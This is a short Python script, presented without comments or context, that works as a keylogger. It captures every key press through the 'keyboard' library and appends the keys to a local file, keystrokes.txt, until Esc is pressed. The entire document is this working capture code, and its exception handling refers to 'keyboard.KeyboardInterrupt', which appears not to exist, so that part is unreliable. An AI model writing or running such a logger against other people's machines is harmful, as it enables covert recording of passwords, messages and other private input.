import keyboard
import sys

def main():
    try:
        with open("keystrokes.txt", "a") as f:
            while True:
                event = keyboard.read_event()
                
                if event.name == 'esc':
                    break
                    
                output = ''
                if event.event_type == keyboard.KEY_DOWN:
                    if len(event.name) > 1 or event.name in ['space', 'enter']:
                        output += f'[{event.name}]'
                    else:
                        output += event.name
                f.write(output)
    except keyboard.KeyboardInterrupt:
        print("Exiting...")
        sys.exit()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit()

if __name__ == "__main__":
    main()